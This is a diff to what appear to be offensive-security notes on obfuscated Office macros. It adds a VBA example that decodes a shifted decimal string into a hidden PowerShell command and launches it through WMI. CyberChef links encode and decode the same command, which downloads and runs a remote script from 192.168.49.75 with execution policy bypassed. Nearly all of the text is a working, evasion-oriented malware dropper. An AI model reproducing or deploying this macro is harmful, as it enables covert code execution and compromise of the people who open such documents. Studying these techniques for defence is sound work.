@@ -54,5 +54,37 @@ Encoder:
 https://gchq.github.io/CyberChef/#recipe=Decode_text('UTF-8%20(65001)')ADD(%7B'option':'Decimal','string':'19'%7D)To_Decimal('Space',false)Find_/_Replace(%7B'option':'Regex','string':'%5E%7C$%7C%20'%7D,'%20%20',true,false,true,true)Find_/_Replace(%7B'option':'Regex','string':'%20(%5C%5Cd%7B1%7D)%20'%7D,'%2000$1%20',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'%20(%5C%5Cd%7B2%7D)%20'%7D,'%200$1%20',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'%20'%7D,'',true,false,true,false)&input=cG93ZXJzaGVsbCAtZXhlYyBieXBhc3MgLW5vcCAtdyBoaWRkZW4gLWMgaWV4KChuZXctb2JqZWN0IHN5c3RlbS5uZXQud2ViY2xpZW50KS5kb3dubG9hZHN0cmluZygnaHR0cDovLzE5Mi4xNjguNDkuNzUvNi44LjEtdjEucHMxJykp
 
 
+Example decoder:
+```
+Function Pomomon(Boomon)
+    Pomomon = Chr(Boomon - 19)
+End Function
+
+Function Strawberries(Boyyolr)
+    Strawberries = Left(Boyyolr, 3)
+End Function
+
+Function Hhonowno(Oemondcvz)
+    Hhonowno = Right(Oemondcvz, Len(Oemondcvz) - 3)
+End Function
+
+Function Qeerere(Nodfmniw)
+    Do
+    Nonropowokwemon = Nonropowokwemon + Pomomon(Strawberries(Nodfmniw))
+    Nodfmniw = Hhonowno(Nodfmniw)
+    Loop While Len(Nodfmniw) > 0
+    Qeerere = Nonropowokwemon
+End Function
+
+Function MyMacro()
+    Dim Nocvbdd As String
+    Dim Mohzqdd As String
+    
+    Nocvbdd = "131130138120133134123120127127051064120139120118051117140131116134134051064129130131051064138051123124119119120129051064118051124120139059059129120138064130117125120118135051134140134135120128065129120135065138120117118127124120129135060065119130138129127130116119134135133124129122059058123135135131077066066068076069065068073075065071076065074072066073065075065068064137068065131134068058060060"
+    Mohzqdd = Qeerere(Nocvbdd)
+    GetObject(Qeerere("138124129128122128135134077")).Get(Qeerere("106124129070069114099133130118120134134")).Create Mohzqdd, Omfodn, Monono, Nappoor
+End Function
+```
+
 Decoder: https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'(.%7B3%7D)'%7D,'$1%20',true,false,true,true)Find_/_Replace(%7B'option':'Regex','string':'%200%2B'%7D,'%20',true,false,true,false)From_Decimal('Space',false)SUB(%7B'option':'Decimal','string':'19'%7D)&input=MTMxMTMwMTM4MTIwMTMzMTM0MTIzMTIwMTI3MTI3MDUxMDY0MTIwMTM5MTIwMTE4MDUxMTE3MTQwMTMxMTE2MTM0MTM0MDUxMDY0MTI5MTMwMTMxMDUxMDY0MTM4MDUxMTIzMTI0MTE5MTE5MTIwMTI5MDUxMDY0MTE4MDUxMTI0MTIwMTM5MDU5MDU5MTI5MTIwMTM4MDY0MTMwMTE3MTI1MTIwMTE4MTM1MDUxMTM0MTQwMTM0MTM1MTIwMTI4MDY1MTI5MTIwMTM1MDY1MTM4MTIwMTE3MTE4MTI3MTI0MTIwMTI5MTM1MDYwMDY1MTE5MTMwMTM4MTI5MTI3MTMwMTE2MTE5MTM0MTM1MTMzMTI0MTI5MTIyMDU5MDU4MTIzMTM1MTM1MTMxMDc3MDY2MDY2MDY4MDc2MDY5MDY1MDY4MDczMDc1MDY1MDcxMDc2MDY1MDc0MDcyMDY2MDczMDY1MDc1MDY1MDY4MDY0MTM3MDY4MDY1MTMxMTM0MDY4MDU4MDYwMDYw
   
